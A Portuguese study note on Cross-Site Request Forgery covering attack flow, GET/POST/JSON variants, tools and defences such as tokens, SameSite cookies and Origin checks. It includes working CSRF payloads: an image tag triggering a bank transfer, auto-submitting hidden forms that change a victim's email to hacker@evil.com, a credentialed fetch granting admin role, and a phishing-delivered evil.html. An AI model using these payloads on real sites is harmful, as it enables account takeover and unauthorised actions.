2025-07-31 18:54

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[CSRF]]

----
# Introdução

***Cross-Site Request Forgery* (CSRF)** é um ataque que força um usuário autenticado a executar ações indesejadas em um aplicativo web sem seu conhecimento. O ataque explora a confiança que um site tem no navegador do usuário, enviando requisições maliciosas enquanto a vítima está logada.

![[Pasted image 20250731185938.png]]

## Impactos do CSRF

- Alteração de senha/e-mail
- Transferências financeiras não autorizadas
- Postagem de conteúdo malicioso
- Exclusão/modificação de dados

---
# Como o CSRF Funciona?

## Requisitos para um Ataque CSRF

1. **Vítima autenticada** em um site vulnerável.
2. **Site sem proteção CSRF** (como tokens aleatórios).
3. **Ação sensível via GET/POST** sem verificação adicional.

![[Pasted image 20250731185814.png]]

## Exemplo de Fluxo de Ataque

1. **Vítima faz login** no `banco.com`
2. **Atacante envia um link malicioso.**

```html
<img src="http://banco.com/transfer?amount=1000&to=attacker" width="0" height="0"
```

3. **Vítima visita o link** (mesmo sem clicar, se o navegador carregar a imagem).
4. **Requisição é enviada com os cookies da sessão**, executando a transferência.

---
# Tipos de Ataques CSRF

## a) CSRF via GET

- Ações sensíveis aceitam requisições GET.
- Exemplo:

```html
<a href="http://site.com/delete-account?id=123">Ver foto!</a>
```

## b) CSRF via POST (Formulários Ocultos)

- Usa um formulário invisível que é enviado automaticamente:

```html
<form action="http://site.com/change-email" method="POST">
	<input type="hidden" name="email" value="hacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

## c) CSRF em APIs (JSON/XML)

- Se a API não verifica `Content-Type` ou CORS, pode ser explorada via JavaScript:

```javascript
fetch('http://api.site.com/update-profile', {
  method: 'POST',
  body: JSON.stringify({ "role": "admin" }),
  credentials: 'include' // Envia cookies
});
```

---
# Ferramentas para Exploração de CSRF

## a) Geradores de Payload CSRF

- **Burp Suite** (Gerador de CSRF no Repeater)
- **CSRF PoC Generator** (Extensão do Chrome)
- **OWASP ZAP** (Teste automatizado)

## b) Ferramentas de Automação

- **XSStrike** (Inclui testes CSRF)
- **Anti-CSRF Tester** (Plugin Burp)

---
# Mitigação e Prevenção

## a) Tokens CSRF (Synchronizer Token Pattern)

- O servidor gera um token único por sessão e o valida em cada requisição.
- Exemplo em  PHP:

```php
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
</form>
```

## b) SameSite Cookies

- Define `SameSite=Lax` ou `SameSite=Strict` para evitar envio em requisições cruzadas

```php
setcookie('sessionID', '123', ['samesite' => 'Lax', 'secure' => true]);
```

## c) Verificação de Referer/Origin Header

- Bloquear requisições de domínios não confiáveis:

```php
if ($_SERVER['HTTP_ORIGIN'] !== 'https://site.com') {
    die("Requisição bloqueada!");
}
```

## d) Cabeçalhos  de Segurança

- `Content-Security-Policy (CSP)` - Restringe fontes de scripts.
- `X-Frame-Options: DENY` - Evita clickjacking (que pode facilitar CSRF).

---
# Exemplo Prático de Exploração

## Passo a Passo (CSRF em Formulário de Mudança de E-mail)

1. **Identificar formulário vulnerável** (sem token CSRF):

```html
<form action="/update-email" method="POST">
  <input type="email" name="new_email">
</form>
```

2. **Criar página maliciosa (`evil.html`)** que envia o formulário:

```html
<form action="http://vulnerable.com/update-email" method="POST">
  <input type="hidden" name="new_email" value="hacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

3. **Enganar a vítima para visitar `evil.html`** (via phishing).
4. **E-mail da vítima é alterado** sem seu consentimento.

---
# Conclusão

CSRF é uma ameaça crítica que explora a confiança de um site no navegador do usuário. A prevenção requer:

✔ **Tokens CSRF** em formulários e APIs  
✔ **Cookies SameSite** e políticas de segurança  
✔ **Validação de cabeçalhos** (`Origin`, `Referer`)

---
# Referências

- [OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger CSRF Guide](https://portswigger.net/web-security/csrf)

